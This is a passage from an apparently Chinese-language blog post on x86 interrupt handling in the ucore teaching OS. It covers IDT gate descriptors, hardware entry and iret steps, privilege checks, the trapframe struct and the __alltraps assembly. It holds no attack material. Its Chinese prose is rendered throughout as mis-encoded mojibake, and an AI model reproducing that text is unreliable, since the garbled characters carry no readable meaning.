·ï¼ŒIDTæ˜¯ä¸€ä¸ª8å­—èŠ‚çš„æè¿°ç¬¦æ•°ç»„ï¼Œä½†IDTçš„ç¬¬ä¸€é¡¹å¯ä»¥åŒ…å«ä¸€ä¸ªæè¿°ç¬¦ã€‚CPUæŠŠä¸­æ–­ï¼ˆå¼‚å¸¸ï¼‰å·ä¹˜ä»¥8åšä¸ºIDTçš„ç´¢å¼•ã€‚IDTå¯ä»¥ä½äºå†…å­˜çš„ä»»æ„ä½ç½®ï¼ŒCPUé€šè¿‡IDTå¯„å­˜å™¨ï¼ˆIDTRï¼‰çš„å†…å®¹æ¥å¯»å€IDTçš„èµ·å§‹åœ°å€ã€‚æŒ‡ä»¤LIDTå’ŒSIDTç”¨æ¥æ“ä½œIDTRã€‚ä¸¤æ¡æŒ‡ä»¤éƒ½æœ‰ä¸€ä¸ªæ˜¾ç¤ºçš„æ“ä½œæ•°ï¼šä¸€ä¸ª6å­—èŠ‚è¡¨ç¤ºçš„å†…å­˜åœ°å€(åŒ…å«çº¿æ€§åœ°å€åŸºå€å’Œç•Œé™)ã€‚</p><p>åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæœ€å¤šä¼šå­˜åœ¨256ä¸ªInterrupt/Exception Vectorsã€‚</p><p>èŒƒå›´[0ï¼Œ31]å†…çš„32ä¸ªå‘é‡è¢«å¼‚å¸¸Exceptionå’ŒNMIä½¿ç”¨ï¼Œä½†å½“å‰å¹¶éæ‰€æœ‰è¿™32ä¸ªå‘é‡éƒ½å·²ç»è¢«ä½¿ç”¨ï¼Œæœ‰å‡ ä¸ªå½“å‰æ²¡æœ‰è¢«ä½¿ç”¨çš„ï¼Œè¯·ä¸è¦æ“…è‡ªä½¿ç”¨å®ƒä»¬ï¼Œå®ƒä»¬è¢«ä¿ç•™ï¼Œä»¥å¤‡å°†æ¥å¯èƒ½å¢åŠ æ–°çš„Exceptionã€‚</p><p>èŒƒå›´[32ï¼Œ255]å†…çš„å‘é‡è¢«ä¿ç•™ç»™ç”¨æˆ·å®šä¹‰çš„Interruptsã€‚Intelæ²¡æœ‰å®šä¹‰ï¼Œä¹Ÿæ²¡æœ‰ä¿ç•™è¿™äº›Interruptsã€‚ç”¨æˆ·å¯ä»¥å°†å®ƒä»¬ç”¨ä½œå¤–éƒ¨I/Oè®¾å¤‡ä¸­æ–­ï¼ˆ8259A IRQï¼‰ï¼Œæˆ–è€…ç³»ç»Ÿè°ƒç”¨ï¼ˆSystem Call ã€Software Interruptsï¼‰ç­‰ã€‚</p></li><li><p><strong>IDT gate descriptors</strong>: Interrupts/Exceptionsåº”è¯¥ä½¿ç”¨Interrupt Gateå’ŒTrap Gateï¼Œå®ƒä»¬ä¹‹é—´çš„å”¯ä¸€åŒºåˆ«å°±æ˜¯ï¼šå½“è°ƒç”¨Interrupt Gateæ—¶ï¼ŒInterruptä¼šè¢«CPUè‡ªåŠ¨ç¦æ­¢ï¼›è€Œè°ƒç”¨Trap Gateæ—¶ï¼ŒCPUåˆ™ä¸ä¼šå»ç¦æ­¢æˆ–æ‰“å¼€ä¸­æ–­ï¼Œè€Œæ˜¯ä¿ç•™å®ƒåŸæ¥çš„æ ·å­ã€‚</p><blockquote><p>ã€è¡¥å……ã€‘æ‰€è°“â€œè‡ªåŠ¨ç¦æ­¢â€ï¼ŒæŒ‡çš„æ˜¯CPUè·³è½¬åˆ°interrupt gateé‡Œçš„åœ°å€æ—¶ï¼Œåœ¨å°†EFLAGSä¿å­˜åˆ°æ ˆä¸Šä¹‹åï¼Œæ¸…é™¤EFLAGSé‡Œçš„IFä½ï¼Œä»¥é¿å…é‡å¤è§¦å‘ä¸­æ–­ã€‚åœ¨ä¸­æ–­å¤„ç†ä¾‹ç¨‹é‡Œï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥å°†EFLAGSé‡Œçš„IFè®¾ä¸Š,ä»è€Œå…è®¸åµŒå¥—ä¸­æ–­ã€‚ä½†æ˜¯å¿…é¡»åœ¨æ­¤ä¹‹å‰åšå¥½å¤„ç†åµŒå¥—ä¸­æ–­çš„å¿…è¦å‡†å¤‡ï¼Œå¦‚ä¿å­˜å¿…è¦çš„å¯„å­˜å™¨ç­‰ã€‚äºŒåœ¨ucoreä¸­è®¿é—®Trap Gateçš„ç›®çš„æ˜¯ä¸ºäº†å®ç°ç³»ç»Ÿè°ƒç”¨ã€‚ç”¨æˆ·è¿›ç¨‹åœ¨æ­£å¸¸æ‰§è¡Œä¸­æ˜¯ä¸èƒ½ç¦æ­¢ä¸­æ–­çš„ï¼Œè€Œå½“å®ƒå‘å‡ºç³»ç»Ÿè°ƒç”¨åï¼Œå°†é€šè¿‡Trap Gateå®Œæˆäº†ä»ç”¨æˆ·æ€ï¼ˆring 3ï¼‰çš„ç”¨æˆ·è¿›ç¨‹è¿›äº†æ ¸å¿ƒæ€ï¼ˆring 0ï¼‰çš„OS kernelã€‚å¦‚æœåœ¨åˆ°è¾¾OS kernelåç¦æ­¢EFLAGSé‡Œçš„IFä½ï¼Œç¬¬ä¸€æ²¡æ„ä¹‰ï¼ˆå› ä¸ºä¸ä¼šå‡ºç°åµŒå¥—ç³»ç»Ÿè°ƒç”¨çš„æƒ…å†µï¼‰ï¼Œç¬¬äºŒè¿˜ä¼šå¯¼è‡´æŸäº›ä¸­æ–­å¾—ä¸åˆ°åŠæ—¶å“åº”ï¼Œæ‰€ä»¥è°ƒç”¨Trap Gateæ—¶ï¼ŒCPUåˆ™ä¸ä¼šå»ç¦æ­¢ä¸­æ–­ã€‚æ€»ä¹‹ï¼Œinterrupt gateå’Œtrap gateä¹‹é—´æ²¡æœ‰ä¼˜å…ˆçº§ä¹‹åˆ†ï¼Œä»…ä»…æ˜¯CPUåœ¨å¤„ç†ä¸­æ–­æ—¶æœ‰ä¸åŒçš„æ–¹æ³•ï¼Œä¾›æ“ä½œç³»ç»Ÿåœ¨å®ç°æ—¶æ ¹æ®éœ€è¦è¿›è¡Œé€‰æ‹©ã€‚</p></blockquote></li><li><p>åœ¨IDTä¸­ï¼Œå¯ä»¥åŒ…å«å¦‚ä¸‹3ç§ç±»å‹çš„Descriptorï¼š</p><ul><li>Task-gate descriptor ï¼ˆè¿™é‡Œæ²¡æœ‰ä½¿ç”¨ï¼‰</li><li>Interrupt-gate descriptor ï¼ˆä¸­æ–­æ–¹å¼ç”¨åˆ°ï¼‰</li><li>Trap-gate descriptorï¼ˆç³»ç»Ÿè°ƒç”¨ç”¨åˆ°ï¼‰</li></ul></li></ul><img src="https://i.loli.net/2021/11/16/qbyzSN56w9eDHKX.png" alt="image-20211116161700420" style="zoom:70%;" /><p>â€‹    Interrrupt Gate and Trap Gate å’ŒCall Gateéå¸¸ç›¸ä¼¼, ä¸åŒçš„Gateç”¨3bitçš„Typeæ¥è¡¨ç¤º:</p><img src="https://s2.loli.net/2021/12/20/FOG4zJsyutojfen.png" alt="image-20211209164600135" style="zoom:67%;" /><h4 id="ç”±ç¡¬ä»¶å®Œæˆçš„å·¥ä½œ"><a href="#ç”±ç¡¬ä»¶å®Œæˆçš„å·¥ä½œ" class="headerlink" title="ç”±ç¡¬ä»¶å®Œæˆçš„å·¥ä½œ"></a>ç”±ç¡¬ä»¶å®Œæˆçš„å·¥ä½œ</h4><ul><li><p>ç¡¬ä»¶ä¸­æ–­å¤„ç†è¿‡ç¨‹1ï¼ˆ==èµ·å§‹==ï¼‰ï¼šä»CPUæ”¶åˆ°ä¸­æ–­äº‹ä»¶åï¼Œæ‰“æ–­å½“å‰ç¨‹åºæˆ–ä»»åŠ¡çš„æ‰§è¡Œï¼Œæ ¹æ®æŸç§æœºåˆ¶è·³è½¬åˆ°ä¸­æ–­æœåŠ¡ä¾‹ç¨‹å»æ‰§è¡Œçš„è¿‡ç¨‹ã€‚å…¶å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>CPUåœ¨æ‰§è¡Œå®Œå½“å‰ç¨‹åºçš„æ¯ä¸€æ¡æŒ‡ä»¤åï¼Œéƒ½ä¼šå»ç¡®è®¤åœ¨æ‰§è¡Œåˆšæ‰çš„æŒ‡ä»¤è¿‡ç¨‹ä¸­ä¸­æ–­æ§åˆ¶å™¨ï¼ˆå¦‚ï¼š<a href="https://blog.csdn.net/longintchar/article/details/79439466">8259A</a>ï¼‰æ˜¯å¦å‘é€ä¸­æ–­è¯·æ±‚è¿‡æ¥ï¼Œå¦‚æœæœ‰é‚£ä¹ˆCPUå°±ä¼šåœ¨ç›¸åº”çš„æ—¶é’Ÿè„‰å†²åˆ°æ¥æ—¶ä»æ€»çº¿ä¸Šè¯»å–ä¸­æ–­è¯·æ±‚å¯¹åº”çš„ä¸­æ–­å‘é‡ï¼›</li><li>CPUæ ¹æ®å¾—åˆ°çš„ä¸­æ–­å‘é‡ï¼ˆä»¥æ­¤ä¸ºç´¢å¼•ï¼‰åˆ°IDTä¸­æ‰¾åˆ°è¯¥å‘é‡å¯¹åº”çš„ä¸­æ–­æè¿°ç¬¦ï¼Œä¸­æ–­æè¿°ç¬¦é‡Œä¿å­˜ç€ä¸­æ–­æœåŠ¡ä¾‹ç¨‹çš„æ®µé€‰æ‹©å­ï¼›</li><li>CPUä½¿ç”¨IDTæŸ¥åˆ°çš„ä¸­æ–­æœåŠ¡ä¾‹ç¨‹çš„æ®µé€‰æ‹©å­ä»**GDT(è¿™å‡ ä¸ªè¡¨ä¸€å®šè¦åŒºåˆ†å¼€æ¥, ç°åœ¨è¿™ä¸ªæ˜¯æŒ‡å¯»å€çš„æ®µæè¿°ç¬¦è¡¨)**ä¸­å–å¾—ç›¸åº”çš„æ®µæè¿°ç¬¦ï¼Œæ®µæè¿°ç¬¦é‡Œä¿å­˜äº†ä¸­æ–­æœåŠ¡ä¾‹ç¨‹çš„æ®µåŸºå€å’Œå±æ€§ä¿¡æ¯ï¼Œæ­¤æ—¶CPUå°±å¾—åˆ°äº†ä¸­æ–­æœåŠ¡ä¾‹ç¨‹çš„èµ·å§‹åœ°å€</li></ul><p>ä»¥ä¸Šä¸‰ä¸ªè¿‡ç¨‹ç¤ºæ„å›¾: <a href='#ipc' id='ipc_r'>link</a> </p><ul><li>CPUä¼šæ ¹æ®CPLå’Œä¸­æ–­æœåŠ¡ä¾‹ç¨‹çš„æ®µæè¿°ç¬¦çš„DPLä¿¡æ¯ç¡®è®¤æ˜¯å¦å‘ç”Ÿäº†ç‰¹æƒçº§çš„è½¬æ¢ã€‚æ¯”å¦‚å½“å‰ç¨‹åºæ­£è¿è¡Œåœ¨ç”¨æˆ·æ€ï¼Œè€Œä¸­æ–­ç¨‹åºæ˜¯è¿è¡Œåœ¨å†…æ ¸æ€çš„ï¼Œåˆ™æ„å‘³ç€å‘ç”Ÿäº†ç‰¹æƒçº§çš„è½¬æ¢ï¼Œè¿™æ—¶CPUä¼šä»å½“å‰ç¨‹åºçš„<strong>TSS</strong>ä¿¡æ¯ï¼ˆè¯¥ä¿¡æ¯åœ¨å†…å­˜ä¸­çš„èµ·å§‹åœ°å€å­˜åœ¨TRå¯„å­˜å™¨ä¸­ï¼‰é‡Œå–å¾—è¯¥ç¨‹åºçš„å†…æ ¸æ ˆåœ°å€ï¼Œå³åŒ…æ‹¬å†…æ ¸æ€çš„sså’Œespçš„å€¼ï¼Œ<strong>å¹¶ç«‹å³å°†ç³»ç»Ÿå½“å‰ä½¿ç”¨çš„æ ˆåˆ‡æ¢æˆæ–°çš„å†…æ ¸æ ˆã€‚</strong>è¿™ä¸ªæ ˆå°±æ˜¯å³å°†è¿è¡Œçš„ä¸­æ–­æœåŠ¡ç¨‹åºè¦ä½¿ç”¨çš„æ ˆã€‚ç´§æ¥ç€å°±å°†å½“å‰ç¨‹åºä½¿ç”¨çš„ç”¨æˆ·æ€çš„sså’Œespå‹åˆ°æ–°çš„å†…æ ¸æ ˆä¸­ä¿å­˜èµ·æ¥ï¼›</li><li>CPUéœ€è¦å¼€å§‹ä¿å­˜å½“å‰è¢«æ‰“æ–­çš„ç¨‹åºçš„ç°åœºï¼ˆå³ä¸€äº›å¯„å­˜å™¨çš„å€¼ï¼‰ï¼Œä»¥ä¾¿äºå°†æ¥æ¢å¤è¢«æ‰“æ–­çš„ç¨‹åºç»§ç»­æ‰§è¡Œã€‚è¿™éœ€è¦åˆ©ç”¨å†…æ ¸æ ˆæ¥ä¿å­˜ç›¸å…³ç°åœºä¿¡æ¯ï¼Œå³ä¾æ¬¡å‹å…¥å½“å‰è¢«æ‰“æ–­ç¨‹åºä½¿ç”¨çš„eflagsï¼Œcsï¼Œeipï¼ŒerrorCodeï¼ˆå¦‚æœæ˜¯æœ‰é”™è¯¯ç çš„å¼‚å¸¸ï¼‰ä¿¡æ¯ï¼›</li><li>CPUåˆ©ç”¨ä¸­æ–­æœåŠ¡ä¾‹ç¨‹çš„æ®µæè¿°ç¬¦å°†å…¶ç¬¬ä¸€æ¡æŒ‡ä»¤çš„åœ°å€åŠ è½½åˆ°cså’Œeipå¯„å­˜å™¨ä¸­ï¼Œå¼€å§‹æ‰§è¡Œä¸­æ–­æœåŠ¡ä¾‹ç¨‹ã€‚è¿™æ„å‘³ç€å…ˆå‰çš„ç¨‹åºè¢«æš‚åœæ‰§è¡Œï¼Œä¸­æ–­æœåŠ¡ç¨‹åºæ­£å¼å¼€å§‹å·¥ä½œã€‚</li></ul></li></ul><hr><ul><li><p>ç¡¬ä»¶ä¸­æ–­å¤„ç†è¿‡ç¨‹2ï¼ˆ==ç»“æŸ==ï¼‰ï¼šä¸­æ–­å¤„ç†å·¥ä½œå®Œæˆåéœ€è¦é€šè¿‡iretï¼ˆæˆ–iretdï¼‰æŒ‡ä»¤æ¢å¤è¢«æ‰“æ–­çš„ç¨‹åºçš„æ‰§è¡Œã€‚CPUæ‰§è¡ŒIRETæŒ‡ä»¤çš„å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç¨‹åºæ‰§è¡Œè¿™æ¡iretæŒ‡ä»¤æ—¶ï¼Œé¦–å…ˆä¼šä»å†…æ ¸æ ˆé‡Œå¼¹å‡ºå…ˆå‰ä¿å­˜çš„è¢«æ‰“æ–­çš„ç¨‹åºçš„ç°åœºä¿¡æ¯ï¼Œå³eflagsï¼Œ<code>cs</code>ï¼Œeipé‡æ–°å¼€å§‹æ‰§è¡Œï¼›</li><li>å¦‚æœå­˜åœ¨ç‰¹æƒçº§è½¬æ¢ï¼ˆ<code>CS(CPL)&gt;DPL</code>ï¼‰ï¼Œåˆ™è¿˜éœ€è¦ä»å†…æ ¸æ ˆä¸­å¼¹å‡ºç”¨æˆ·æ€æ ˆçš„sså’Œespï¼Œè¿™æ ·ä¹Ÿæ„å‘³ç€æ ˆä¹Ÿè¢«åˆ‡æ¢å›åŸå…ˆä½¿ç”¨çš„ç”¨æˆ·æ€çš„æ ˆäº†ï¼›</li><li>å¦‚æœæ­¤æ¬¡å¤„ç†çš„æ˜¯å¸¦æœ‰é”™è¯¯ç ï¼ˆerrorCodeï¼‰çš„å¼‚å¸¸ï¼ŒCPUåœ¨æ¢å¤å…ˆå‰ç¨‹åºçš„ç°åœºæ—¶ï¼Œå¹¶ä¸ä¼šå¼¹å‡ºerrorCodeã€‚è¿™ä¸€æ­¥éœ€è¦é€šè¿‡è½¯ä»¶å®Œæˆï¼Œå³è¦æ±‚ç›¸å…³çš„ä¸­æ–­æœåŠ¡ä¾‹ç¨‹åœ¨è°ƒç”¨iretè¿”å›ä¹‹å‰æ·»åŠ å‡ºæ ˆä»£ç ä¸»åŠ¨å¼¹å‡ºerrorCodeã€‚</li></ul></li></ul><p><a href='#ipc_r' id='ipc'><img src="https://i.loli.net/2021/11/16/hGLAjlTYVSWpk67.png" alt="image-20211116161700420" style="zoom:70%;" /></a></p><h4 id="ç‰¹æƒçº§æ£€æŸ¥"><a href="#ç‰¹æƒçº§æ£€æŸ¥" class="headerlink" title="ç‰¹æƒçº§æ£€æŸ¥"></a>ç‰¹æƒçº§æ£€æŸ¥</h4><ul><li><p>ä¸­æ–­å¤„ç†å¾—==ç‰¹æƒçº§è½¬æ¢==æ˜¯é€šè¿‡é—¨æè¿°ç¬¦ï¼ˆgate descriptorï¼‰å’Œç›¸å…³æŒ‡ä»¤æ¥å®Œæˆçš„ã€‚ä¸€ä¸ªé—¨æè¿°ç¬¦å°±æ˜¯ä¸€ä¸ªç³»ç»Ÿç±»å‹çš„æ®µæè¿°ç¬¦ï¼Œä¸€å…±æœ‰4ä¸ªå­ç±»å‹ï¼š</p><ul><li>è°ƒç”¨é—¨æè¿°ç¬¦ï¼ˆcall-gate descriptor may reside in the GDT or in an LDT, but not in the interrupt descriptor table (IDT)ï¼‰ï¼Œ</li><li>ä¸­æ–­é—¨æè¿°ç¬¦ï¼ˆinterrupt-gate descriptorï¼‰</li><li>é™·é˜±é—¨æè¿°ç¬¦ï¼ˆtrap-gate descriptorï¼‰</li><li>ä»»åŠ¡é—¨æè¿°ç¬¦ï¼ˆtask-gate descriptorï¼‰ã€‚</li></ul><p>Task gates are used for task switching and are discussed in Chapter 7, â€œTask Managementâ€. Trap and interrupt<br>gates are special kinds of call gates used for calling exception and interrupt handlersã€‚ä¸­æ–­é—¨æè¿°ç¬¦å’Œé™·é˜±é—¨æè¿°ç¬¦å‡ ä¹æ˜¯ä¸€æ ·çš„ã€‚</p><ul><li>ä¸­æ–­å‘ç”Ÿæ—¶å®æ–½ç‰¹æƒæ£€æŸ¥çš„è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</li></ul><img src="https://i.loli.net/2021/11/16/fqGtF4SHxWPCJhg.png" alt="è¿™é‡Œæ˜¯å›¾ç‰‡æè¿°" style="zoom:80%;" /><ul><li>é—¨ä¸­çš„DPLå’Œæ®µé€‰æ‹©ç¬¦ä¸€èµ·æ§åˆ¶ç€è®¿é—®ï¼ŒåŒæ—¶ï¼Œæ®µé€‰æ‹©ç¬¦ç»“åˆåç§»é‡ï¼ˆOffsetï¼‰æŒ‡å‡ºäº†ä¸­æ–­å¤„ç†ä¾‹ç¨‹çš„å…¥å£ç‚¹ã€‚å†…æ ¸ä¸€èˆ¬åœ¨é—¨æè¿°ç¬¦ä¸­å¡«å…¥å†…æ ¸ä»£ç æ®µçš„æ®µé€‰æ‹©å­ã€‚äº§ç”Ÿä¸­æ–­å‰åï¼ŒCPUä¸€å®šä¸ä¼šå°†è¿è¡Œæ§åˆ¶ä»é«˜ç‰¹æƒç¯è½¬å‘ä½ç‰¹æƒç¯ï¼Œç‰¹æƒçº§å¿…é¡»è¦ä¹ˆä¿æŒä¸å˜ï¼ˆå½“æ“ä½œç³»ç»Ÿå†…æ ¸è‡ªå·±è¢«ä¸­æ–­çš„æ—¶å€™ï¼‰ï¼Œæˆ–è¢«æå‡ï¼ˆå½“ç”¨æˆ·æ€ç¨‹åºè¢«ä¸­æ–­çš„æ—¶å€™ï¼‰ã€‚æ— è®ºå“ªä¸€ç§æƒ…å†µï¼ŒCPLå¿…é¡»å¤§äºç­‰äºç›®çš„ä»£ç æ®µçš„DPLã€‚å¦‚æœCPLå‘ç”Ÿäº†æ”¹å˜ï¼Œä¸€ä¸ªå †æ ˆåˆ‡æ¢æ“ä½œï¼ˆé€šè¿‡<strong>TSS</strong>å®Œæˆï¼‰å°±ä¼šå‘ç”Ÿã€‚å¦‚æœä¸­æ–­æ˜¯è¢«ç”¨æˆ·æ€ç¨‹åºä¸­çš„æŒ‡ä»¤æ‰€è§¦å‘çš„ï¼ˆæ¯”å¦‚è½¯ä»¶æ‰§è¡ŒINT nç”Ÿäº§çš„ä¸­æ–­ï¼‰ï¼Œè¿˜ä¼šå¢åŠ ä¸€ä¸ªé¢å¤–çš„æ£€æŸ¥ï¼šé—¨çš„DPLå¿…é¡»å…·æœ‰ä¸CPLç›¸åŒæˆ–æ›´ä½çš„ç‰¹æƒã€‚è¿™å°±é˜²æ­¢äº†ç”¨æˆ·ä»£ç éšæ„è§¦å‘ä¸­æ–­ã€‚å¦‚æœè¿™äº›æ£€æŸ¥å¤±è´¥ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªä¸€èˆ¬ä¿æŠ¤å¼‚å¸¸ï¼ˆgeneral-protection exceptionï¼‰ã€‚</li></ul></li></ul><h4 id="ucoreçš„å®ç°æµç¨‹"><a href="#ucoreçš„å®ç°æµç¨‹" class="headerlink" title="ucoreçš„å®ç°æµç¨‹"></a>ucoreçš„å®ç°æµç¨‹</h4><ol><li>é¦–å…ˆä¸­æ–­æœ‰å‡ ç§ç±»å‹<ul><li>ä½¿ç”¨intè½¯ä¸­æ–­, ä¸­æ–­å·ä¸º<code>T_SWITCH_TOU</code>. ç”±äºä¸€å¼€å§‹ucoreè¿è¡Œåœ¨å†…æ ¸, æ‰€ä»¥å†…æ ¸åˆ°ç”¨æˆ·æ—¶ä¼šå¼¹å‡ºæ ˆä¸Šçš„sså’Œesp, æ‰€ä»¥è¦åœ¨intæŒ‡ä»¤å‰é¢åŠ ä¸Šä¸¤ä¸ªpush, è¿˜è¦æ³¨æ„æŒ‡ä»¤çš„å­—èŠ‚é•¿åº¦åŒ¹é….</li><li>ä½¿ç”¨intè½¯ä¸­æ–­, ä¸­æ–­å·ä¸º<code>T_SWITCH_TOK</code>. è¿™ä¸ªæ—¶å€™ä»ç”¨æˆ·æ€åˆ°å†…æ ¸æ€, è¦é€šè¿‡TRå¯„å­˜å™¨æŸ¥æ‰¾å½“å‰çš„å†…æ ¸æ ˆåœ°å€, ç«‹å³åˆ‡æ¢ç„¶åå‹å…¥ç”¨æˆ·æ€çš„sså’Œesp, ç”±äºchallengeé‡Œæœ‰è¯´æ˜ä¸ç”¨è¿”å›, æ‰€ä»¥intæ‰§è¡Œå®Œåè¦é‡Šæ”¾è¿™ä¸¤ä¸ªä¸œè¥¿.</li><li>å…¶ä»–æƒ…å†µå°±æ˜¯æ—¶é’Ÿä¸­æ–­å’Œé”®ç›˜ä¸­æ–­åˆ°ç›®å‰ä¸ºæ­¢éƒ½æ˜¯å†…æ ¸-&gt;å†…æ ¸å†è·³å›å†…æ ¸, æ²¡æœ‰ä»€ä¹ˆå¤æ‚ä¹‹å¤„.</li></ul></li><li>cpuæ¥æ”¶åˆ°ä¸­æ–­å·, ç„¶ååˆ°IDTè¡¨é‡ŒæŠŠä¸­æ–­å·å½“åšä¸‹æ ‡æŸ¥æ‰¾Interrupt Discriptor, è¿™ä¸ªæ—¶å€™å°±æ‰¾åˆ°äº†ä¸­æ–­å¤„ç†ä¾‹ç¨‹çš„å…¥å£åœ°å€.</li><li>cpuä¾æ¬¡å‹å…¥eflagsï¼Œcsï¼Œeip, errorCode(å¦‚æœæ˜¯æœ‰é”™è¯¯ç çš„å¼‚å¸¸), ç„¶ååŠ è½½æè¿°ç¬¦ä¸­çš„åœ°å€, è¿›å…¥ä¸­æ–­å¤„ç†ä¾‹ç¨‹.</li><li>å¤„ç†ä¾‹ç¨‹ä¸€å¼€å§‹å°±æ˜¯ä¸¤ä¸ªpushl, åˆ†åˆ«æ˜¯errorCodeå’Œtrapno), å†jmpåˆ°<code>__alltraps</code>æŠŠå¯èƒ½éœ€è¦æ”¹å˜çš„å¯„å­˜å™¨å€¼å‹åˆ°æ ˆä¸Š<br>åœ¨æ ˆä¸Šå€’ç€æ„å»ºä¸€ä¸ªtrapframe</li><li>æ¥ä¸‹æ¥è¿›å…¥å¤„ç†ä¾‹ç¨‹, 0-31ä¸­æ–­å·ç”±Intelä¿ç•™, ucoreå®šä¹‰çš„ç”¨<code>IRQ_OFFSET + IRQ_xx</code><ul><li>å¦‚æœæ˜¯æ—¶é’Ÿä¸­æ–­, incä¸€ä¸ªå…¨å±€å˜é‡tick, æ²¡å•¥å¤æ‚çš„</li><li>å¦‚æœæ˜¯ç‰¹æƒçº§è½¬æ¢, æ›´æ”¹ä¸€ä¸‹trapframeçš„cs, es, ds, fså³å¯</li></ul></li><li>æ‰§è¡Œå®Œæ¯•åå¼¹å‡ºç”±æˆ‘ä»¬å‹å…¥çš„å¯„å­˜å™¨å€¼, ç„¶ååˆ°äº†<code>__altraps</code>çš„<code>iret</code>æŒ‡ä»¤,  ç”±cpuå¼¹å‡ºeip, cs, eflags</li><li>åˆ¤æ–­ç‰¹æƒçº§è½¬æ¢æ¥å†³å®šæ˜¯å¦å¼¹å‡ºss, esp, <strong>ä¸­æ–­ç»“æŸ</strong> </li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* registers as pushed by pushal */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pushregs</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> reg_edi;<br>    <span class="hljs-keyword">uint32_t</span> reg_esi;<br>    <span class="hljs-keyword">uint32_t</span> reg_ebp;<br>    <span class="hljs-keyword">uint32_t</span> reg_oesp;          <span class="hljs-comment">/* Useless */</span><br>    <span class="hljs-keyword">uint32_t</span> reg_ebx;<br>    <span class="hljs-keyword">uint32_t</span> reg_edx;<br>    <span class="hljs-keyword">uint32_t</span> reg_ecx;<br>    <span class="hljs-keyword">uint32_t</span> reg_eax;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pushregs</span> <span class="hljs-title">tf_regs</span>;</span><br>    <span class="hljs-keyword">uint16_t</span> tf_gs;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding0;<br>    <span class="hljs-keyword">uint16_t</span> tf_fs;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding1;<br>    <span class="hljs-keyword">uint16_t</span> tf_es;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding2;<br>    <span class="hljs-keyword">uint16_t</span> tf_ds;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding3;<br>    <span class="hljs-keyword">uint32_t</span> tf_trapno;<br>    <span class="hljs-comment">/* below here defined by x86 hardware */</span><br>    <span class="hljs-keyword">uint32_t</span> tf_err;<br>    <span class="hljs-keyword">uintptr_t</span> tf_eip;<br>    <span class="hljs-keyword">uint16_t</span> tf_cs;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding4;<br>    <span class="hljs-keyword">uint32_t</span> tf_eflags;<br>    <span class="hljs-comment">/* below here only when crossing rings, such as from user to kernel */</span><br>    <span class="hljs-keyword">uintptr_t</span> tf_esp;<br>    <span class="hljs-keyword">uint16_t</span> tf_ss;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding5;<br>&#125; __attribute__((packed));<br></code></pre></div></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">#----------------------------vector.S<br>.globl vector120<br>vector120:<br>  pushl $0<br>  pushl $120<br>  jmp __alltraps<br>#----------------------------trapentry.S<br>#include &lt;memlayout.h&gt;<br><br># vectors.S sends all traps here.<br>.text<br>.globl __alltraps<br>__alltraps:<br>    # push registers to build a trap frame<br>    # therefore make the stack look like a struct trapframe<br>    pushl %ds<br>    pushl %es<br>    pushl %fs<br>    pushl %gs<br>    pushal<br><br>    # load GD_KDATA into %ds and %es to set up data segments for kernel<br>    movl $GD_KDATA, %eax<br>    movw %ax, %ds<br>    movw %ax, %es<br><br>    # push %esp to pass a pointer to the trapframe as an argument to trap()<br>    pushl %esp<br><br>    # call trap(tf), where tf=%esp<br>    call trap<br><br>    # pop the pushed stack pointer<br>    popl %esp<br><br>    # return falls through to trapret...<br>.globl __trapret<br>__trapret:<br>    # restore registers from stack<br>    popal<br><br>    # restore %ds, %es, %fs and %gs<br>    popl %gs<br>    popl %fs<br>    popl %es<br>    popl 